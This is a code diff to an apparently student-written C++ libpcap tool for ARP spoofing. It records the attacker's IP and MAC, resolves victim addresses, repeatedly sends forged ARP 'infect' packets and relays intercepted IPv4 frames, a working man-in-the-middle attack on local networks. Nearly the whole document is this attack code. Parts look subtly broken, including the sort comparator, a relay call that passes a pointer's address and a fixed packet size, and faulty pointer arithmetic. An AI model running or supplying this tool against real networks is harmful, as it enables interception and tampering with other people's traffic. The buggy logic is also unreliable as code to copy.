@@ -1,4 +1,5 @@
 #include <cstdio>
+#include <iostream>
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
@@ -19,12 +20,17 @@ struct EthArpPacket final {
     ArpHdr arp_;
 };
 typedef struct info {
-    Ip target_ip;
-    Ip sender_ip;
-    Mac target_mac;
-    Mac sender_mac;
+    Ip target_ip=Ip(0);
+    Ip sender_ip=Ip(0);
+    Mac target_mac=Mac::nullMac();
+    Mac sender_mac=Mac::nullMac();
+    EthArpPacket infect_packet;
 }info;
-bool operator < (info x, info y) { return x.sender_ip<y.sender_ip; }
+bool operator < (info x, info y)
+{
+    if(x.sender_mac<y.sender_mac) return x.target_mac<y.target_mac;
+    return x.sender_mac<y.sender_mac;
+}
 #pragma pack(pop)
 Ip attacker_ip;
 Mac attacker_mac;
@@ -33,7 +39,7 @@ void usage() {
     printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
 }
-int get_attacker_ip(char* dev, uint32_t* ip)
+int get_attacker_ip(char* dev)
 {
     struct ifreq ifr;
     uint8_t ip_arr[Ip::SIZE];
@@ -50,12 +56,12 @@ int get_attacker_ip(char* dev, uint32_t* ip)
         return FAIL;
     }
     memcpy(ip_arr, ifr.ifr_addr.sa_data+2, Ip::SIZE);
-    *ip=(ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
+    attacker_ip=(ip_arr[0]<<24)|(ip_arr[1]<<16)|(ip_arr[2]<<8)|(ip_arr[3]);
     close(sockfd);
     return SUCCESS;
 }
 
-int get_attacker_mac(char* dev, uint8_t* mac)
+int get_attacker_mac(char* dev)
 {
     struct ifreq ifr;
     int sockfd=socket(AF_INET, SOCK_DGRAM, 0);
@@ -71,11 +77,13 @@ int get_attacker_mac(char* dev, uint8_t* mac)
         close(sockfd);
         return FAIL;
     }
+    uint8_t mac[Mac::SIZE];
     memcpy(mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
+    attacker_mac=Mac(mac);
     close(sockfd);
     return SUCCESS;
 }
-EthArpPacket get_packet(Ip attacker_ip, Ip sender_ip, Mac attacker_mac)
+EthArpPacket get_packet(Ip sender_ip)
 {
     EthArpPacket packet;
     packet.eth_.smac_ = Mac(attacker_mac);
@@ -92,7 +100,7 @@ EthArpPacket get_packet(Ip attacker_ip, Ip sender_ip, Mac attacker_mac)
     packet.arp_.tip_ = htonl(sender_ip);
     return packet;
 }
-int get_mac_by_ip(char* dev, Ip sender_ip, Mac attacker_mac, Ip attacker_ip, uint8_t* mac)
+int get_mac_by_ip(char* dev, Ip sender_ip, uint8_t* mac)
 {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -100,7 +108,7 @@ int get_mac_by_ip(char* dev, Ip sender_ip, Mac attacker_mac, Ip attacker_ip, uin
         printf("Failed to get MAC! (reason : couldn't open device %s - %s)\n",dev,errbuf);
         return FAIL;
     }
-    EthArpPacket packet=get_packet(attacker_ip, sender_ip, attacker_mac);
+    EthArpPacket packet=get_packet(sender_ip);
     struct pcap_pkthdr* packet_hdr;
     const u_char* temp_packet;
     EthArpPacket* recv_packet;
@@ -126,7 +134,7 @@ int get_mac_by_ip(char* dev, Ip sender_ip, Mac attacker_mac, Ip attacker_ip, uin
     }
     return SUCCESS;
 }
-EthArpPacket get_infect_packet(Ip target_ip, Ip sender_ip, Mac sender_mac, Mac attacker_mac)
+EthArpPacket get_infect_packet(Ip target_ip, Ip sender_ip, Mac sender_mac)
 {
     EthArpPacket packet;
     packet.eth_.dmac_ = sender_mac;
@@ -146,24 +154,24 @@ EthArpPacket get_infect_packet(Ip target_ip, Ip sender_ip, Mac sender_mac, Mac a
 int get_info(char* dev, Ip sender_ip, Ip target_ip, info* Case_info)
 {
     uint8_t mac_arr[Mac::SIZE];
-    int ret=get_mac_by_ip(dev, sender_ip, attacker_mac, attacker_ip, mac_arr);
+    int ret=get_mac_by_ip(dev, sender_ip, mac_arr);
     if(ret<0) return FAIL;
     Mac sender_mac=Mac(mac_arr);
-    ret=get_mac_by_ip(dev, target_ip, attacker_mac, attacker_ip, mac_arr);
+    ret=get_mac_by_ip(dev, target_ip, mac_arr);
     if(ret<0) return FAIL;
     Mac target_mac=Mac(mac_arr);
     Case_info->target_ip=target_ip;
     Case_info->sender_ip=sender_ip;
     Case_info->target_mac=target_mac;
     Case_info->sender_mac=sender_mac;
+    Case_info->infect_packet=get_infect_packet(target_ip, sender_ip, sender_mac);
     return SUCCESS;
 }
 void arp_infect(pcap_t* handle)
 {
     while(1) {
         for(auto info : info_vector) {
-            EthArpPacket infect_packet=get_infect_packet(info.target_ip, info.sender_ip, info.sender_mac, attacker_mac);
-            int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&infect_packet), sizeof(EthArpPacket));
+            int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&info.infect_packet), sizeof(EthArpPacket));
             if(ret!=0) printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
         }
         sleep(10);
@@ -174,9 +182,7 @@ int arp_relay(pcap_t* handle, const u_char* temp_packet, Mac target_mac)
 {
     EthArpPacket* recv_packet=(EthArpPacket*)temp_packet;
     recv_packet->eth_.smac_=attacker_mac;
-    recv_packet->arp_.smac_=attacker_mac;
     recv_packet->eth_.dmac_=target_mac;
-    recv_packet->arp_.tmac_=target_mac;
     int ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&recv_packet), sizeof(EthArpPacket));
     if(ret!=0) {
         printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
@@ -196,14 +202,11 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
-    uint32_t ip;
-    int ret=get_attacker_ip(dev, &ip);
-    if(ret<0) return -1;
-    attacker_ip=Ip(ip);
-    uint8_t attacker_mac_arr[Mac::SIZE];
-    ret=get_attacker_mac(dev,attacker_mac_arr);
-    if(ret<0) return -1;
-    attacker_mac=Mac(attacker_mac_arr);
+    int ret=get_attacker_ip(dev);
+    if(ret==FAIL) return -1;
+    ret=get_attacker_mac(dev);
+    if(ret==FAIL) return -1;
+    std::cout << "attacker ip : " << std::string(attacker_ip) << ", attacker mac : " << std::string(attacker_mac) << '\n';
     int cnt=(argc-2)/2;
     for(int i = 1; i <= cnt; i++) {
         printf("Case num : %d\n",i);
@@ -213,6 +216,8 @@ int main(int argc, char* argv[]) {
         ret=get_info(dev, sender_ip, target_ip, &Case_info);
         if(ret==FAIL) break;
         info_vector.push_back(Case_info);
+        std::cout << "sender ip : " << std::string(Case_info.sender_ip) << ", sender mac : " << std::string(Case_info.sender_mac) << '\n';
+        std::cout << "target ip : " << std::string(Case_info.target_ip) << ", target mac : " << std::string(Case_info.target_mac) << '\n';
     }
     std::sort(info_vector.begin(), info_vector.end());
     std::thread arp_infect_thread(arp_infect, handle);
@@ -228,21 +233,34 @@ int main(int argc, char* argv[]) {
         }
         recv_packet=(EthArpPacket*)temp_packet;
         info temp;
-        temp.sender_ip=(ntohl(recv_packet->arp_.sip_));
-        auto it=std::lower_bound(info_vector.begin(), info_vector.end(), temp);
-        if(it==info_vector.end()) continue;
-        info packet_info=*it;
-        if(packet_info.sender_ip!=temp.sender_ip) continue;
-        if(recv_packet->eth_.type()==htons(EthHdr::Ip4)) {
-            ret=arp_relay(handle, temp_packet, packet_info.target_mac);
-            if(ret<0) return -1;
+        //printf("eth type : %u\nhtons(Ip4) : %u, htons(Arp) : %u\n",recv_packet->eth_.type(),htons(EthHdr::Ip4),htons(EthHdr::Arp));
+        if(recv_packet->eth_.type()==EthHdr::Ip4) {
+            temp.sender_mac=recv_packet->eth_.smac_;
+            Ip dip=Ip(ntohl(*((uint32_t*)(recv_packet+sizeof(EthHdr)+16))));
+            auto it=std::lower_bound(info_vector.begin(), info_vector.end(), temp);
+            for(; it!=info_vector.end(); it++) {
+                info packet_info=*it;
+                if(packet_info.sender_mac!=recv_packet->eth_.smac_) break;
+                if(recv_packet->eth_.dmac_!=attacker_mac||dip!=packet_info.target_ip) continue;
+                std::cout << "Relay Packet\nsender_ip : " << std::string(packet_info.sender_ip) << ", sender_mac : " << std::string(packet_info.sender_mac) << '\n';
+                std::cout << "target_ip : " << std::string(packet_info.target_ip) << ", target_mac : " << std::string(packet_info.target_mac) << '\n';
+                ret=arp_relay(handle, temp_packet, packet_info.target_mac);
+                if(ret<0) return -1;
+            }
         }
-        else if(recv_packet->eth_.type()==htons(EthHdr::Arp)) {
-            EthArpPacket infect_packet=get_infect_packet(packet_info.target_ip, packet_info.sender_ip, packet_info.sender_mac, attacker_mac);
-            ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&infect_packet), sizeof(EthArpPacket));
-            if(ret!=0) {
-                printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
-                return -1;
+        else if(recv_packet->eth_.type()==EthHdr::Arp) {
+            temp.sender_mac=recv_packet->arp_.smac_;
+            auto it=std::lower_bound(info_vector.begin(), info_vector.end(), temp);
+            for(; it!=info_vector.end(); it++) {
+                info packet_info=*it;
+                if(packet_info.sender_mac!=recv_packet->arp_.smac_) break;
+                std::cout << "We will send arp infection packet!\nsender_ip : " << std::string(packet_info.sender_ip) << ", sender_mac : " << std::string(packet_info.sender_mac) << '\n';
+                std::cout << "target_ip : " << std::string(packet_info.target_ip) << ", target_mac : " << std::string(packet_info.target_mac) << '\n';
+                ret=pcap_sendpacket(handle, reinterpret_cast<u_char*>(&packet_info.infect_packet), sizeof(EthArpPacket));
+                if(ret!=0) {
+                    printf("Failed to get MAC! (reason : pcap_sendpacket return %d error=%s)\n",ret,pcap_geterr(handle));
+                    return -1;
+                }
             }
         }
     }
